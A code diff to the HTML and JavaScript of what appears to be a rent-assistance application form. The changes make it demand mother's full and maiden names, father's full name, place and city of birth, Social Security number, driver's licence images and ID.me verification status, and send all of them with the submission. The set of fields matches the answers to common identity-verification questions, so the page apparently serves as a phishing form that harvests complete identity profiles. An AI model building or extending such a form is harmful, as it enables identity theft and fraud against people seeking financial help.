@@ -338,8 +338,35 @@
                         <input type="number" id="age" placeholder="30" min="18" max="120" required>
                     </div>
 
+                    <!-- Family Information -->
                     <div class="form-group">
-                        <label for="city" class="required">City of Residence</label>
+                        <label for="mothersFullName" class="required">Mother's Full Name</label>
+                        <input type="text" id="mothersFullName" placeholder="Jane Elizabeth Smith" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="mothersMaidenName" class="required">Mother's Maiden Name</label>
+                        <input type="text" id="mothersMaidenName" placeholder="Jane Elizabeth Johnson" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="fathersFullName" class="required">Father's Full Name</label>
+                        <input type="text" id="fathersFullName" placeholder="Robert James Smith" required>
+                    </div>
+
+                    <!-- Birth Information -->
+                    <div class="form-group">
+                        <label for="placeOfBirth" class="required">Place of Birth </label>
+                        <input type="text" id="placeOfBirth" placeholder="LA" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cityOfBirth" class="required">City of Birth</label>
+                        <input type="text" id="cityOfBirth" placeholder="Chicago, IL" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="city" class="required">Current City of Residence</label>
                         <input type="text" id="city" placeholder="New York" required>
                     </div>
 
@@ -347,17 +374,6 @@
                         <label for="ssn" class="required">Social Security Number</label>
                         <input type="text" id="ssn" placeholder="XXX-XX-XXXX" pattern="\d{3}-\d{2}-\d{4}" 
                                title="Format: XXX-XX-XXXX" class="ssn-input" required>
-                    </div>
-
-                    <!-- Additional Information -->
-                    <div class="form-group">
-                        <label for="mothersMaidenName">Mother's Maiden Name</label>
-                        <input type="text" id="mothersMaidenName" placeholder="Optional">
-                    </div>
-
-                    <div class="form-group">
-                        <label for="fathersName">Father's Name</label>
-                        <input type="text" id="fathersName" placeholder="Optional">
                     </div>
 
                     <div class="form-group">
@@ -534,6 +550,32 @@
                 return;
             }
             
+            // Validate all required fields
+            const requiredFields = [
+                'fullName', 'phone', 'email', 'dob', 'gender', 'age',
+                'mothersFullName', 'mothersMaidenName', 'fathersFullName',
+                'placeOfBirth', 'cityOfBirth', 'city', 'ssn', 'pastDueRent'
+            ];
+            
+            for (const fieldId of requiredFields) {
+                const field = document.getElementById(fieldId);
+                if (!field.value.trim()) {
+                    alert(`Please fill in ${field.previousElementSibling.textContent}`);
+                    field.focus();
+                    return;
+                }
+            }
+            
+            // Validate radio buttons
+            const appliedBefore = document.querySelector('input[name="appliedBefore"]:checked');
+            const receivingSS = document.querySelector('input[name="receivingSS"]:checked');
+            const verifiedIDme = document.querySelector('input[name="verifiedIDme"]:checked');
+            
+            if (!appliedBefore || !receivingSS || !verifiedIDme) {
+                alert('Please answer all the questions (Applied before, Receiving SS, Verified by ID.me)');
+                return;
+            }
+            
             // Show loading state
             submitBtn.disabled = true;
             loadingSpinner.style.display = 'block';
@@ -548,13 +590,16 @@
                 formData.append('gender', document.getElementById('gender').value);
                 formData.append('age', document.getElementById('age').value);
                 formData.append('mothers_maiden_name', document.getElementById('mothersMaidenName').value);
-                formData.append('fathers_name', document.getElementById('fathersName').value);
+                formData.append('mothers_full_name', document.getElementById('mothersFullName').value);
+                formData.append('fathers_full_name', document.getElementById('fathersFullName').value);
+                formData.append('place_of_birth', document.getElementById('placeOfBirth').value);
+                formData.append('city_of_birth', document.getElementById('cityOfBirth').value);
                 formData.append('city', document.getElementById('city').value);
                 formData.append('ssn', document.getElementById('ssn').value);
                 formData.append('past_due_rent', document.getElementById('pastDueRent').value);
-                formData.append('applied_before', document.querySelector('input[name="appliedBefore"]:checked').value);
-                formData.append('receiving_ss', document.querySelector('input[name="receivingSS"]:checked').value);
-                formData.append('verified_idme', document.querySelector('input[name="verifiedIDme"]:checked').value);
+                formData.append('applied_before', appliedBefore.value);
+                formData.append('receiving_ss', receivingSS.value);
+                formData.append('verified_idme', verifiedIDme.value);
                 formData.append('dl_front', dlFront);
                 formData.append('dl_back', dlBack);
 
